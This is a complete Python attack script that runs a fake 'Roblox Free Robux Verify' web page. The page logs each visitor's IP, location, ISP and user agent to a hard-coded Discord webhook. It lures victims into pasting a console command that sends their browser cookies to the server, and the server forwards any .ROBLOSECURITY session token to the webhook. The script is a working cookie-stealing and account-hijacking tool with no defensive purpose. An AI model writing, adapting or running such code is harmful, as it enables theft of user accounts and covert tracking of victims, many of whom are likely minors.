import http.server
import socketserver
import requests
import datetime

# CHANGE THESE
WEBHOOK = "https://discord.com/api/webhooks/1472620898107396118/-Kp-d19ezXwTxxl-lwfMrP8Xil6iCh38ys4EDgXqC_As_7yiybzzmTHFCJgvvYhy2HAb"
IMAGE = "https://imgur.com/qSnlmy1"  # direct link
PORT = 8080  # default ok

class BeamHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ip = self.client_address[0]
        ua = self.headers.get('User-Agent', 'N/A')
        ref = self.headers.get('Referer', 'Direct')
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # geo
        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
        country, city, isp = geo.get('country','??'), geo.get('city','??'), geo.get('isp','??')

        # embed
        embed = {
            "title": "🔥 BUILT-IN BEAM! No Flask Pog",
            "color": 16711680,
            "fields": [
                {"name": "IP", "value": f"{ip}", "inline": True},
                {"name": "Loc", "value": f"{country}/{city}", "inline": True},
                {"name": "ISP", "value": isp},
                {"name": "UA", "value": f"```{ua}```"},
                {"name": "Ref", "value": ref},
                {"name": "Time", "value": ts}
            ]
        }
        requests.post(WEBHOOK, json={"embeds": [embed]})

        # fake page bait
        page = f"""<!DOCTYPE html>
<html><body style="text-align:center;background:#111;color:#0f0;font-family:Arial;">
<h1>Roblox Free Robux Verify 2026</h1>
<p>Open console (F12) → paste this → Enter:</p>
<pre>fetch("{self.headers.get('Host')}/grab", {{method:"POST",body:document.cookie,headers:{{"Content-Type":"text/plain"}}}}).then(r=>alert("Claimed!"))</pre>
<p>Paste then refresh Roblox for 10k Robux drop!</p>
<img src="{IMAGE}" style="max-width:90%;">
</body></html>"""

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(page.encode())

    def do_POST(self):
        if self.path == '/grab':
            len = int(self.headers['Content-Length'])
            data = self.rfile.read(len).decode()
            if '.ROBLOSECURITY' in data:
                requests.post(WEBHOOK, json={"embeds": [{"title": "JACKPOT .ROBLOSECURITY", "description": f"```{data}```", "color": 65280}]})
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Logged")

Handler = BeamHandler
with socketserver.TCPServer(("", PORT), Handler) as srv:
    print(f"Beam server live on port {PORT}")
    srv.serve_forever()
